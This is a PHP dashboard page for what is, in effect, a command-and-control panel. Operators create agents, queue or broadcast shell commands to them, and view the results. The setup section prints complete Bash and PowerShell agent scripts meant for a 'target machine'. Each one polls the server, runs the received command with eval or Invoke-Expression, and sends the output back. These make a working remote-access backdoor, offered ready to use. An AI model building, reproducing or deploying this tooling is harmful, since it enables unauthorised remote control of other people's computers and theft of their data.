<?php
// index.php - Main dashboard to manage agents and commands
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Create agents directory if not exists
if (!file_exists('agents')) {
    mkdir('agents', 0777);
}

// Handle actions
$action = $_GET['action'] ?? 'dashboard';
?>
<!DOCTYPE html>
<html>
<head>
    <title>⚡ Webhook Agent System</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0e12; 
            color: #e1e4e8; 
            font-family: 'SF Mono', 'Fira Code', monospace;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        
        /* Header */
        h1 { 
            color: #58a6ff; 
            font-size: 24px;
            border-bottom: 2px solid #30363d;
            padding-bottom: 15px;
            margin-bottom: 25px;
        }
        
        /* Cards */
        .card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #30363d;
        }
        
        .card-header h2 { 
            color: #58a6ff; 
            font-size: 18px;
        }
        
        /* Buttons */
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            font-family: inherit;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
        }
        
        .btn:hover { background: #2ea043; }
        .btn-danger { background: #da3633; }
        .btn-danger:hover { background: #f85149; }
        .btn-secondary { background: #21262d; }
        .btn-secondary:hover { background: #30363d; }
        
        /* Forms */
        input, textarea, select {
            background: #0d1117;
            border: 1px solid #30363d;
            color: #e1e4e8;
            padding: 8px 12px;
            border-radius: 6px;
            font-family: inherit;
            width: 100%;
            margin-bottom: 10px;
        }
        
        input:focus, textarea:focus {
            outline: none;
            border-color: #58a6ff;
        }
        
        /* Agent List */
        .agent-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .agent-card {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 15px;
        }
        
        .agent-card h3 {
            color: #58a6ff;
            margin-bottom: 10px;
        }
        
        .agent-status {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            background: #1f6feb;
            color: white;
        }
        
        .command-list {
            margin-top: 15px;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .command-item {
            background: #161b22;
            padding: 8px;
            margin: 5px 0;
            border-left: 3px solid #238636;
            font-family: monospace;
            font-size: 12px;
        }
        
        .result-item {
            background: #0d1117;
            padding: 10px;
            margin: 5px 0;
            border-radius: 4px;
            border-left: 3px solid #8957e5;
        }
        
        .timestamp {
            color: #8b949e;
            font-size: 11px;
        }
        
        /* Terminal */
        .terminal {
            background: #0d1117;
            padding: 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            height: 400px;
            overflow-y: auto;
        }
        
        .terminal-line {
            color: #7ee787;
            margin: 2px 0;
            white-space: pre-wrap;
            font-size: 13px;
        }
        
        .terminal-input {
            display: flex;
            margin-top: 10px;
        }
        
        .terminal-input span {
            color: #7ee787;
            margin-right: 8px;
        }
        
        .terminal-input input {
            background: transparent;
            border: none;
            color: #7ee787;
            font-family: inherit;
            padding: 0;
            margin: 0;
        }
        
        .terminal-input input:focus {
            outline: none;
        }
        
        /* Code */
        code {
            background: #1f2428;
            padding: 2px 6px;
            border-radius: 4px;
            color: #ff7b72;
        }
        
        .copy-btn {
            background: #21262d;
            color: #e1e4e8;
            border: none;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            cursor: pointer;
            margin-left: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ Webhook Agent System (Polling-Based)</h1>
        
        <!-- Create New Agent -->
        <div class="card">
            <div class="card-header">
                <h2>📡 Create New Agent</h2>
            </div>
            <form method="POST" action="api.php?action=create_agent">
                <div style="display: grid; grid-template-columns: 2fr 1fr 1fr auto; gap: 10px;">
                    <input type="text" name="agent_name" placeholder="Agent Name (e.g., Windows-10)" required>
                    <input type="text" name="tags" placeholder="Tags (e.g., work, home)">
                    <select name="interval">
                        <option value="5">Poll every 5s</option>
                        <option value="10">Poll every 10s</option>
                        <option value="30">Poll every 30s</option>
                        <option value="60">Poll every 1min</option>
                    </select>
                    <button type="submit" class="btn">Generate Agent</button>
                </div>
            </form>
        </div>
        
        <!-- Agents Dashboard -->
        <div class="card">
            <div class="card-header">
                <h2>🤖 Active Agents</h2>
                <button class="btn btn-secondary" onclick="location.reload()">↻ Refresh</button>
            </div>
            
            <div class="agent-grid">
                <?php
                $agents = glob('agents/*', GLOB_ONLYDIR);
                foreach ($agents as $agent_dir):
                    $agent_id = basename($agent_dir);
                    $config_file = $agent_dir . '/config.json';
                    $commands_file = $agent_dir . '/commands.json';
                    $results_file = $agent_dir . '/results.json';
                    
                    if (!file_exists($config_file)) continue;
                    
                    $config = json_decode(file_get_contents($config_file), true);
                    $commands = file_exists($commands_file) ? json_decode(file_get_contents($commands_file), true) : [];
                    $results = file_exists($results_file) ? json_decode(file_get_contents($results_file), true) : [];
                    
                    $last_seen = $config['last_seen'] ?? 'Never';
                    $time_diff = $last_seen !== 'Never' ? (time() - strtotime($last_seen)) : 999;
                ?>
                <div class="agent-card">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <h3><?php echo htmlspecialchars($config['name']); ?></h3>
                        <span class="agent-status" style="background: <?php echo $time_diff < 60 ? '#238636' : '#da3633'; ?>">
                            <?php echo $time_diff < 60 ? 'Online' : 'Offline'; ?>
                        </span>
                    </div>
                    
                    <p style="color: #8b949e; font-size: 12px; margin: 5px 0;">
                        ID: <code><?php echo $agent_id; ?></code>
                        <button class="copy-btn" onclick="copyText('<?php echo $agent_id; ?>')">Copy</button>
                    </p>
                    
                    <p style="color: #8b949e; font-size: 12px;">
                        Last Seen: <?php echo $last_seen; ?>
                        <?php if ($time_diff < 300): ?>
                        (<?php echo $time_diff; ?>s ago)
                        <?php endif; ?>
                    </p>
                    
                    <p style="color: #8b949e; font-size: 12px;">
                        Tags: <?php echo htmlspecialchars($config['tags'] ?? 'none'); ?>
                    </p>
                    
                    <div style="margin: 15px 0;">
                        <h4 style="color: #58a6ff; font-size: 14px;">Send Command</h4>
                        <form method="POST" action="api.php?action=add_command" style="display: flex; gap: 5px;">
                            <input type="hidden" name="agent_id" value="<?php echo $agent_id; ?>">
                            <input type="text" name="command" placeholder="e.g., whoami, ls, ipconfig" style="flex: 1;" required>
                            <button type="submit" class="btn btn-secondary" style="padding: 8px;">→</button>
                        </form>
                    </div>
                    
                    <?php if (!empty($commands)): ?>
                    <div>
                        <h4 style="color: #58a6ff; font-size: 14px;">Pending Commands (<?php echo count($commands); ?>)</h4>
                        <div class="command-list">
                            <?php foreach (array_slice($commands, -3) as $cmd): ?>
                            <div class="command-item">
                                <div><?php echo htmlspecialchars($cmd['command']); ?></div>
                                <div class="timestamp"><?php echo $cmd['timestamp']; ?></div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    <?php endif; ?>
                    
                    <?php if (!empty($results)): ?>
                    <div style="margin-top: 15px;">
                        <h4 style="color: #58a6ff; font-size: 14px;">Last Result</h4>
                        <div class="result-item">
                            <div style="font-weight: bold;"><?php echo htmlspecialchars(end($results)['command']); ?></div>
                            <pre style="font-size: 11px; margin-top: 5px; overflow-x: auto;"><?php echo htmlspecialchars(substr(end($results)['output'], 0, 100)); ?>...</pre>
                            <div class="timestamp"><?php echo end($results)['timestamp']; ?></div>
                        </div>
                    </div>
                    <?php endif; ?>
                    
                    <div style="margin-top: 15px; display: flex; gap: 5px;">
                        <button class="btn btn-secondary" onclick="window.open('terminal.html?agent=<?php echo $agent_id; ?>', '_blank')">
                            🖥️ Terminal
                        </button>
                        <form method="POST" action="api.php?action=delete_agent" style="display: inline;" onsubmit="return confirm('Delete this agent?')">
                            <input type="hidden" name="agent_id" value="<?php echo $agent_id; ?>">
                            <button type="submit" class="btn btn-danger">🗑️ Delete</button>
                        </form>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <?php if (empty($agents)): ?>
                <div style="grid-column: 1/-1; text-align: center; color: #8b949e; padding: 40px;">
                    No agents yet. Create your first agent!
                </div>
                <?php endif; ?>
            </div>
        </div>
        
        <!-- Quick Commands -->
<div class="card">
    <div class="card-header">
        <h2>⚡ Quick Broadcast to ALL Agents</h2>
    </div>
    <form method="POST" action="api.php?action=broadcast">
        <div style="display: grid; grid-template-columns: 1fr auto; gap: 10px;">
            <input type="text" name="command" placeholder="Command to send to ALL agents" required>
            <button type="submit" class="btn">🚀 Broadcast to All</button>
        </div>
    </form>
    
    <!-- Optional: AJAX version for better UX -->
    <div style="margin-top: 10px;">
        <button onclick="broadcastCommand()" class="btn btn-secondary">📡 Broadcast via AJAX</button>
    </div>
</div>

<script>
function broadcastCommand() {
    const command = prompt("Enter command to broadcast to ALL agents:");
    if (!command) return;
    
    const formData = new FormData();
    formData.append('action', 'broadcast');
    formData.append('command', command);
    
    fetch('api.php', {
        method: 'POST',
        headers: {
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        alert(data.message);
        location.reload();
    })
    .catch(error => {
        alert('Error: ' + error);
    });
}
</script>
        
        <!-- How to Use -->
        <div class="card">
            <div class="card-header">
                <h2>📋 Agent Setup Instructions</h2>
            </div>
            <div style="background: #0d1117; padding: 15px; border-radius: 6px;">
                <p style="margin-bottom: 10px;">1. <strong>Create an agent above</strong> - Get your unique agent ID</p>
                <p style="margin-bottom: 10px;">2. <strong>On the target machine, run this script:</strong></p>
                
                <pre style="background: #1f2428; padding: 15px; border-radius: 6px; overflow-x: auto;"><code>#!/bin/bash
# agent.sh - Save this on the target machine

AGENT_ID="YOUR_AGENT_ID_HERE"
SERVER="http://<?php echo $_SERVER['HTTP_HOST']; ?><?php echo dirname($_SERVER['PHP_SELF']); ?>"

while true; do
    # Check for commands
    COMMAND=$(curl -s "$SERVER/api.php?action=get_command&agent_id=$AGENT_ID")
    
    if [ ! -z "$COMMAND" ] && [ "$COMMAND" != "null" ]; then
        echo "Executing: $COMMAND"
        
        # Execute command and send result back
        OUTPUT=$(eval "$COMMAND" 2>&1)
        
        curl -s -X POST "$SERVER/api.php?action=send_result" \
            -d "agent_id=$AGENT_ID" \
            -d "command=$COMMAND" \
            -d "output=$OUTPUT"
    fi
    
    sleep 5  # Poll every 5 seconds
done</code></pre>

                <p style="margin-top: 15px;"><strong>PowerShell version (Windows):</strong></p>
                <pre style="background: #1f2428; padding: 15px; border-radius: 6px; overflow-x: auto;"><code># agent.ps1
$agentId = "YOUR_AGENT_ID_HERE"
$server = "http://<?php echo $_SERVER['HTTP_HOST']; ?><?php echo dirname($_SERVER['PHP_SELF']); ?>"

while($true) {
    # Check for commands
    $command = (Invoke-WebRequest "$server/api.php?action=get_command&agent_id=$agentId").Content
    
    if ($command -and $command -ne "null") {
        Write-Host "Executing: $command"
        
        # Execute command
        $output = Invoke-Expression $command 2>&1 | Out-String
        
        # Send result back
        $body = @{
            agent_id = $agentId
            command = $command
            output = $output
        }
        Invoke-WebRequest -Uri "$server/api.php?action=send_result" -Method POST -Body $body
    }
    
    Start-Sleep -Seconds 5
}</code></pre>
            </div>
        </div>
    </div>
    
    <script>
        function copyText(text) {
            navigator.clipboard.writeText(text);
            alert('Copied!');
        }
        
        // Auto-refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);
    </script>
</body>
</html>